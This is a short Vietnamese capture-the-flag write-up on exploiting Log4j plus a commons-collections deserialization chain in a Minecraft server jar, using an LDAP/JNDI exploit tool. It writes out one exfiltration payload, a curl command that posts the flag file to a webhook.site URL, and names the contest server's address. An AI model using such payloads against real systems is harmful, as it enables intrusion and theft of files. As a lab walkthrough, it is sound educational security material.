# Solution


Bài viết gốc có thể xem tại [đây](https://hackmd.io/@taidh/Bk94PZjt9).

Mình mới học về log4j cách đâu 2 ngày nhưng may thay được dịp gặp được cái chall về nó nên sẽ viết về solution mà chủ yếu từ wu của một đàn anh.

Server cho một file `server_1.15.jar` và để ta có thể dùng `tlauncher` để debug local.
Nhờ vào decription của tác giả ta có thể lên mạng tìm một version khác của nó để check sự khác biệt (mình có tải sẵn ở [đây](https://github.com/to016/CTFs/blob/main/2022/KMACTF/mineme/mineme/app/server.jar) )

Dùng intellij idea để kiểm tra sự khác nhau của 2 `.jar` file

![diff](https://user-images.githubusercontent.com/77546253/174476296-12876d99-e575-46ac-b33a-ce20413a2d12.png)


Ta có thể thấy bên file của đề có sử dụng `collections` và cũng có rất nhiều gadget chain phổ biến với nó. Việc còn lại là set up một ldap server để có thể transer serialized data. Cách này vừa có thể giúp ta khai khác log4j + deserialization vừa bypass được các version mới của jdk. Có thể dùng tool [này](https://github.com/WhiteHSBG/JNDIExploit).

![log4j_exploitable](https://user-images.githubusercontent.com/77546253/174476309-7bd4b92a-78ad-47ed-a001-fc3f6b97b512.png)

Đầu tiên ta thử ở local với command `calc.exe`

![local_test](https://user-images.githubusercontent.com/77546253/174476297-de034404-4216-41d1-bba7-9086bbe830f9.png)



OK giờ thử trên server của giải: `149.28.135.96:13337` với payload: `curl -X POST -d @/flag https://webhook.site/ac119b03-212f-443a-aca6-5e230bfc7544`

Encode payload:

![encode_payload](https://user-images.githubusercontent.com/77546253/174476303-a41d0b56-c1f5-489d-8518-d2be2dbe0da0.png)


Kết quả:

![flag](https://user-images.githubusercontent.com/77546253/174476325-e02aa983-a592-43be-babe-f571a0cba74f.png)





